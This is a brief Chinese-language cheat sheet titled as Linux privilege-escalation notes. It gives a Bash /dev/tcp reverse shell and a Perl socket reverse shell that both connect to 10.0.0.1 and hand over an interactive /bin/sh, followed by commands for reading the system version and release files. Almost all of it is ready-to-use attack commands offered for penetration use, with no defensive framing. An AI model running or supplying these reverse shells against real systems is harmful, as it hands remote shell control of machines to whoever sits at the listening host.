# GUN Linux 提权笔记

### Shell反弹
    1.1 **Bash反弹**
``` sh
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
    1.2 **Perl反弹**
``` sh
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### 查看系统版本

``` sh
$ uname -a
$ cat /etc/*-release
$ cat /etc/issue
```
